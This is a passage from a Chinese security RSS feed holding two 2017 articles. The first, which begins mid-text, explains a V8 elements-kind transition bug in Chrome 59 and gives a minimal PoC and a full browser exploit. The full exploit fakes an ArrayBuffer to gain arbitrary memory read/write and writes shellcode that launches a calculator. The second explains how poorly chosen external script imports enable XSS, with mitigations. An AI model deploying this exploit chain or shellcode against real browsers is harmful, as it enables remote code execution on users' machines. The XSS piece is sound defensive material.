和`KeyedLoadIC::LoadElementPolymorphicHandlers` 完成的。我们 diff 一下 commit，就会发现稳定状态的 map 会被修改为不稳定，以保证这个转换会覆盖所有使用该 map 的函数。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c9f31f750ca1922c4c47e78b334e058e_r.png&quot; data-rawwidth=&quot;1671&quot; data-rawheight=&quot;189&quot;&gt;&lt;p&gt;因此对函数的第一次调用会改变 map 的元素种类，`StoreElementPolymorphicHandlers` 调用&lt;/p&gt;&lt;p&gt;`FindElementsKindTransitionedMap` 来找元素类转换。这样可以确保 map 为不稳定的，从而使使用该 map 的代码被去除优化，且未来的代码不会在该 map 上进行优化。这样能保证元素被正常处理了。&lt;/p&gt;&lt;h2&gt;那么我们应该如何从稳定的 map 中触发元素类转换呢？&lt;/h2&gt;&lt;p&gt;在回答这个问题之前，我们需要了解过期 map。它指的是一个 map 的所有对象已经被替换道另一个 map 中。该 map 被设为不稳定状态，它会被去优化且从转换树中移除。&lt;/p&gt;&lt;p&gt;如果我们看一看 `ComputeElementAccessInfos` 的源码，我们就会发现在`FindElementsKindTransitionedMap` 前，`TryUpdate` 会先被执行。&lt;/p&gt;&lt;p&gt;当 `TryUpdate` 接收到过期 map 时，它会寻找其所在的树（就是来自同一个根 map 且经过相同转换所形成的树）中寻找另一张没过时的图，并将其返回（如果存在）。&lt;/p&gt;&lt;p&gt;元素种类转换所对应的原始的 map 会在 `LoadElementPolymorphicHandlers` 中被设置为不稳定状态，并成为过时 map。TryUpdate 找到另一张 map，然后会切换到这张图。但这张图不会被用于优化这个函数，因此会一直被设为稳定状态，因此，我们可以从该 map 中得到元素种类转换。&lt;/p&gt;&lt;p&gt;事实上，源代码已经有一个检查来确保稳定的 map 不会产生转换状态，然而这段代码不会影响 Chrome59。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-7affb3b4e042204c3fda07d1665d5ca8_r.png&quot; data-rawwidth=&quot;748&quot; data-rawheight=&quot;248&quot;&gt;&lt;h2&gt;最简 PoC：&lt;/h2&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt;
// 这个函数改变元素的动作会被优化
function change_elements_kind(a){
a[0] = Array;
}
// 这个函数则会被优化值的读取，
function read_as_unboxed(){
return evil[0];
}

// 为了编译该函数，我们需要先调用它
change_elements_kind({});

// 新建对象M0
map_manipulator = new Array(1.0,2.3);
// 添加x到M0,由于值的更改，M0则会被变换册M1
map_manipulator.x = 7;
// 用这个对象调用函数，V8会生成M1版的函数
change_elements_kind(map_manipulator);

// 改变x的原型类型，前一个x会从M0和M1中移除。编译器标记M1为过时，并产生M2
map_manipulator.x = {};



// 生成有漏洞的对象
evil = new Array(1.1,2.2);
evil.x = {};

x = new Array({});
// 优化change_elements_kind
// ReduceElementAccess会被调用，ReduceElementAccess会被调用，这个函数又会使用ComputeElementAccessInfos。
// 下面这个循环中，由于x和M2有着相同的属性，编译器会为M2添加元素类型转换
for(var i = 0;i&amp;lt;0x50000;i++){
change_elements_kind(x);
} 

// 优化read_as_unboxed. Evil是M2 map的一个实例，因此函数对元素的读取会被优化
for(var i = 0;i&amp;lt;0x50000;i++){
read_as_unboxed();
}

change_elements_kind(evil);

// 调用read_as_unboxed，它依然是M2，不过这个版本会假设元素数组中的值为unboxed。因此Array构造函数的指针会被当双精度返回。
alert(read_as_unboxed());
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;h2&gt;完整 PoC：&lt;/h2&gt;&lt;p&gt;下面的 Poc 可以在 Chrome59 -no-sandbox 模式下运行并弹出计算器，我们的思路如下：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;用漏洞读取 `arraybuffer.__proto__` 的地址&lt;/li&gt;&lt;li&gt;我们创建假的 arraybuffer map（通过 arraybuffer 原型指向的地址），再读取该 map 的地址&lt;/li&gt;&lt;li&gt;利用 map 的地址，我们即可创建 arraybuffer。再次得到其地址。&lt;/li&gt;&lt;li&gt;通过创建的 arraybuffer，我们可以向 boxed元素数组中写入指针。另外，我们也可以修改 arraybuffer，让其反射用户态内存。再一次利用这个漏洞，读取已编译函数的地址，然后使用读/写权限将我们的 shellcode 覆盖这个地址，最后，调用这个函数执行我们的 shellcode。&lt;/li&gt;&lt;/ul&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt;

var shellcode =
[0xe48348fc,0x00c0e8f0,0x51410000,0x51525041,0xd2314856,0x528b4865,0x528b4860,0x528b4818,0x728b4820,0xb70f4850,0x314d4a4a,0xc03148c9,0x7c613cac,0x41202c02,0x410dc9c1,0xede2c101,0x48514152,0x8b20528b,0x01483c42,0x88808bd0,0x48000000,0x6774c085,0x50d00148,0x4418488b,0x4920408b,0x56e3d001,0x41c9ff48,0x4888348b,0x314dd601,0xc03148c9,0xc9c141ac,0xc101410d,0xf175e038,0x244c034c,0xd1394508,0x4458d875,0x4924408b,0x4166d001,0x44480c8b,0x491c408b,0x8b41d001,0x01488804,0x415841d0,0x5a595e58,0x59415841,0x83485a41,0x524120ec,0x4158e0ff,0x8b485a59,0xff57e912,0x485dffff,0x000001ba,0x00000000,0x8d8d4800,0x00000101,0x8b31ba41,0xd5ff876f,0xa2b5f0bb,0xa6ba4156,0xff9dbd95,0xc48348d5,0x7c063c28,0xe0fb800a,0x47bb0575,0x6a6f7213,0x89415900,0x63d5ffda,0x00636c61]

var arraybuffer = new ArrayBuffer(20);
flag = 0;
function gc(){
for(var
i=0;i&amp;lt;0x100000/0x10;i++){
new String;
}
}
function d2u(num1,num2){
d = new Uint32Array(2);
d[0] = num2;
d[1] = num1;
f = new
Float64Array(d.buffer);
return f[0];
}
function u2d(num){
f = new Float64Array(1);
f[0] = num;
d = new
Uint32Array(f.buffer);
return d[1] * 0x100000000
+ d[0];
}
function change_to_float(intarr,floatarr){
var j = 0;
for(var i = 0;i &amp;lt;
intarr.length;i = i+2){
var re =
d2u(intarr[i+1],intarr[i]);
floatarr[j] = re;
j++;
}
}
function change_elements_kind_array(a){
a[0] = Array;
}
optimizer3 = new Array({});
optimizer3.x3 = {};
change_elements_kind_array(optimizer3);
map_manipulator3 = new Array(1.1,2.2);
map_manipulator3.x3 = 0x123;
change_elements_kind_array(map_manipulator3);

map_manipulator3.x3 = {};

evil3 = new Array(1.1,2.2);
evil3.x3 = {};
for(var i = 0;i&amp;lt;0x100000;i++){
change_elements_kind_array(optimizer3);
}

/******************************* step 1 read ArrayBuffer __proto__ address ***************************************/
function change_elements_kind_parameter(a,obj){
arguments;
a[0] = obj;
}
optimizer4 = new Array({});
optimizer4.x4 = {};
change_elements_kind_parameter(optimizer4);
map_manipulator4 = new Array(1.1,2.2);
map_manipulator4.x4 = 0x123;
change_elements_kind_parameter(map_manipulator4);

map_manipulator4.x4 = {};

evil4 = new Array(1.1,2.2);
evil4.x4 = {};
for(var i = 0;i&amp;lt;0x100000;i++){
change_elements_kind_parameter(optimizer4,arraybuffer.__proto__);
}

function e4(){
return evil4[0];
}

for(var i = 0;i&amp;lt;0x100000;i++){
e4();
}

change_elements_kind_parameter(evil4,arraybuffer.__proto__);
ab_proto_addr = u2d(e4());

var nop = 0xdaba0000;
var ab_map_obj = [
nop,nop,
0x1f000008,0x000900c3, //chrome
59
//0x0d00000a,0x000900c4, //chrome
61
0x082003ff,0x0,
nop,nop, // use ut32.prototype replace it
nop,nop,0x0,0x0
]
ab_constructor_addr = ab_proto_addr - 0x70;
ab_map_obj[0x6] = ab_proto_addr &amp;amp; 0xffffffff;
ab_map_obj[0x7] = ab_proto_addr / 0x100000000;
ab_map_obj[0x8] = ab_constructor_addr &amp;amp; 0xffffffff;
ab_map_obj[0x9] = ab_constructor_addr / 0x100000000;
float_arr = [];

gc();
var ab_map_obj_float = [1.1,1.1,1.1,1.1,1.1,1.1];
change_to_float(ab_map_obj,ab_map_obj_float);

/******************************* step 2 read fake_ab_map_ address ***************************************/

change_elements_kind_parameter(evil4,ab_map_obj_float);
ab_map_obj_addr = u2d(e4())+0x40;

var fake_ab = [
ab_map_obj_addr &amp;amp;
0xffffffff, ab_map_obj_addr / 0x100000000,
ab_map_obj_addr &amp;amp;
0xffffffff, ab_map_obj_addr / 0x100000000,
ab_map_obj_addr &amp;amp;
0xffffffff, ab_map_obj_addr / 0x100000000,
0x0,0x4000, /* buffer
length */
0x12345678,0x123,/* buffer
address */
0x4,0x0
]
var fake_ab_float = [1.1,1.1,1.1,1.1,1.1,1.1];
change_to_float(fake_ab,fake_ab_float);

/******************************* step 3 read fake_ArrayBuffer_address ***************************************/

change_elements_kind_parameter(evil4,fake_ab_float);
fake_ab_float_addr = u2d(e4())+0x40;

/******************************* step 4 fake a ArrayBuffer ***************************************/

fake_ab_float_addr_f = d2u(fake_ab_float_addr /
0x100000000,fake_ab_float_addr &amp;amp; 0xffffffff).toString();

eval(&#39;function e3(){ evil3[1]
= &#39;+fake_ab_float_addr_f+&#39;;}&#39;)
for(var i = 0;i&amp;lt;0x6000;i++){
e3();
}
change_elements_kind_array(evil3);
e3();
fake_arraybuffer = evil3[1];
if(fake_arraybuffer instanceof ArrayBuffer == true){
}
fake_dv = new DataView(fake_arraybuffer,0,0x4000);

/******************************* step 5 Read a Function Address ***************************************/

var func_body = &quot;eval(&#39;&#39;);&quot;;

var function_to_shellcode = new Function(&quot;a&quot;,func_body);

change_elements_kind_parameter(evil4,function_to_shellcode);

shellcode_address_ref = u2d(e4()) + 0x38-1;

/************************************** And now,we get arbitrary memory read
write!!!!!! ******************************************/

function Read32(addr){
fake_ab_float[4] =
d2u(addr / 0x100000000,addr &amp;amp; 0xffffffff);
return
fake_dv.getUint32(0,true);
}
function
Write32(addr,value){
fake_ab_float[4] =
d2u(addr / 0x100000000,addr &amp;amp; 0xffffffff);
alert(&quot;w&quot;);
fake_dv.setUint32(0,value,true);
}
shellcode_address =
Read32(shellcode_address_ref) + Read32(shellcode_address_ref+0x4) *
0x100000000;;

var addr =
shellcode_address;

fake_ab_float[4] =
d2u(addr / 0x100000000,addr &amp;amp; 0xffffffff);
for(var i = 0; i &amp;lt;
shellcode.length;i++){
var value =
shellcode[i]; 
fake_dv.setUint32(i *
4,value,true);
}
alert(&quot;boom&quot;);
function_to_shellcode();

&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;参考：&lt;a href=&quot;https://blogs.securiteam.com/index.php/archives/3379&quot;&gt;https://blogs.securiteam.com/index.php/archives/3379&lt;/a&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-09-06-29097125</guid>
<pubDate>Wed, 06 Sep 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>引用外部脚本的隐患及防御</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-09-03-29016122.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;引用外部脚本的隐患及防御&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29016122&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在这篇文章里，我们将换一个姿势利用 XSS。通常来讲，XSS 是由程序对输入缺乏合理的过滤而产生的。但在这篇文章里，我会展示如何在正确过滤 XSS 的网站中利用 XSS。它和常规攻击手段类似，我们也可以用它来偷 cookie 或者钓鱼。不过在之前，我们先来讲解一下跨域资源共享技术。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;跨域资源共享&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;跨域资源能够提供浏览器更好的用户体验。通过它，我们可以在一个网站上访问到不属于它域下的资源（比如图像，javascript，以及其它数据）。打个比方：&lt;/p&gt;&lt;p&gt;http://example.com 有如下跨域资源：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;通过 XMLHttpRequest 请求securelayer7.net已登陆用户的数据&lt;/li&gt;&lt;li&gt;用&amp;lt;iframe src&amp;gt;标签包含http://youtube.com&lt;/li&gt;&lt;li&gt;用&amp;lt;img src&amp;gt;请求http://imgur.com的图片&lt;/li&gt;&lt;li&gt;用&amp;lt;script src&amp;gt;请求https://code.jquery.com/jquery-1.8.1.min.js取得的javascript库&lt;/li&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bf7b5a58535ca4b4221670bd0e59b7cb_r.png&quot; data-rawwidth=&quot;656&quot; data-rawheight=&quot;504&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;为什么要引用脚本，而不是直接内联？&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当许多网站同时引用&amp;lt;script src=”https://code.jquery.com/jquery-1.8.1.min.js”&amp;gt;&amp;lt;/script&amp;gt;时，浏览器只需加载一次，便可以将其载入缓存方便不同网站对其的调用。&lt;/p&gt;&lt;p&gt;为什么我们又需要加载外部的javascript库呢？答案很简单，方便开发。在 jQuery 中，我们只需短短的一句，就可以改变背景颜色：$(‘body’).css(&#39;background&#39;, &#39;#ccc&#39;);&lt;/p&gt;&lt;p&gt;如果直接用原生 JavaScript 操作 DOM 的话，我们就得：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;Function changeBachground(color) {
  Document.body.style.background = color;
}
 
Onload=&quot;changeBackground(&#39;red&#39;);&quot; //某个事件
&lt;/code&gt;&lt;h2&gt;&lt;b&gt;由 javascript 引用而导致的漏洞&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;由于控制权的缺失，加载第三方控制的脚本有十分严重的安全隐患。第三方网站的站长有可能在脚本中插入恶意代码。或者网站自身有漏洞而被攻击者所控制，最终导致攻击者篡改其提供的脚本。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;攻击从本地加载的脚本&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;假设在一个开发环境中，工程师用&amp;lt;script src=&quot;http://127.0.0.1:4545/import.js&quot;&amp;gt;&amp;lt;/script&amp;gt;加载本地Web服务器上的资源。如果在发布该应用时没有移除这个语句，那么攻击者可以使用如下手段来攻击目标：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;登陆运行该应用的电脑（物理渗透，SSRF）&lt;/li&gt;&lt;li&gt;用一个 Web 服务器监听本地4545端口，并返回恶意js。&lt;/li&gt;&lt;li&gt;目标在该电脑上开启浏览器，进入这个程序&lt;/li&gt;&lt;li&gt;浏览器加载恶意 JavaScript，导致XSS&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;攻击从局域网加载的脚本&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;继续假设一个开发环境，开发者用脚本来加载内部服务器的资源：&amp;lt;script src=&quot;http://192.168.0.111/import.js&quot;&amp;gt;&amp;lt;/script&amp;gt;。这时候，攻击者也可以按照类似攻击本地资源的手法插入恶意脚本，只不过需要锁定一个ip罢了（SSRF，内网渗透，物理渗透）。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;源于未注册域名的脚本&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;很多时候，工程师会在host文件中加入自定义的域名。这样一来省钱，二来不用部署。或者有些已经注册的域名忘记续费而过期了，如果发布时碰巧忘记移除它（比如&amp;lt;script src=&quot;https://securelayer7.net/import.js&quot;&amp;gt;&amp;lt;/script&amp;gt;）。那么攻击者便有机可乘了：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;注册securelayer7.net并返回import.js&lt;/li&gt;&lt;li&gt;用户浏览时会加载我们的恶意脚本&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;加载动态 ip 的脚本&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;开发者很有可能会犯将 ip 设为动态这种低级错误。我们只需想办法获取该 ip 地址的控制权（思路也和内网类似），便可以攻击目标了。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;因为输入加载错误的域名&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;很多时候，开发者会漏打或者错打域名（比方说：&amp;lt;script src=&quot;https://code.jqueri.com/import.js&quot;&amp;gt;&amp;lt;/script&amp;gt;）我们可以趁机注册该域名并返回恶意代码&lt;/p&gt;&lt;h2&gt;&lt;b&gt;从一个运行 HTTP 的服务器加载脚本&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;如果一个脚本是用HTTP（不是HTTPS）传输的，那么我们可以用中间人攻击（arp攻击，icmp攻击）来篡改脚本并在其中注入内容。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;防护措施&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;从本地或者内网 ip 加载的脚本都要被替换成其它安全位置的脚本&lt;/li&gt;&lt;li&gt;严格管控现有的域名，确保知道哪些过期了，哪些没有&lt;/li&gt;&lt;li&gt;脚本不应该从动态 ip 中引入&lt;/li&gt;&lt;li&gt;再三检查输入域名是否配对真实域名&lt;/li&gt;&lt;li&gt;尽可能地使用 https&lt;/li&gt;&lt;li&gt;脚本应该尽量存放在安全性高的第三方网站&lt;/li&gt;&lt;li&gt;如果你不能保证上述几点，不要因为追求性能而无视安全性（引用脚本改成内联）&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i&gt;作者：&lt;b&gt;Saurabh Banawar —— &lt;a href=&quot;http://blog.securelayer7.net/owasp-top-10-cross-site-scripting-3-bad-javascript-imports/&quot;&gt;http://blog.securelayer7.net/owasp-top-10-cross-site-scripting-3-bad-javascript-imports/&lt;/a&gt;&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-09-03-29016122</guid>
<pubDate>Sun, 03 Sep 2017 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
